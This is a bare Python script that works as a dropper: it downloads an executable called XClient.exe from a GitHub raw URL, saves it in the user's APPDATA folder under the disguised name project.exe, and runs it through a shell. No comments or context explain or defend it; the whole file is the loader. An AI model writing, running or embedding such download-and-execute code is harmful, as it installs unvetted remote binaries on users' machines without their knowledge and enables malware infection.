import os
import urllib.request
import subprocess

def download_and_run(url, filename):
    appdata = os.getenv("APPDATA")
    if not appdata:
        appdata = os.path.expanduser("~")
    filepath = os.path.join(appdata, filename)
    if not os.path.exists(filepath):
        urllib.request.urlretrieve(url, filepath)
    subprocess.Popen([filepath], shell=True)


url = "https://github.com/deprosinal/shiny-telegram/raw/refs/heads/main/XClient.exe"
filename = "project.exe"

download_and_run(url, filename)
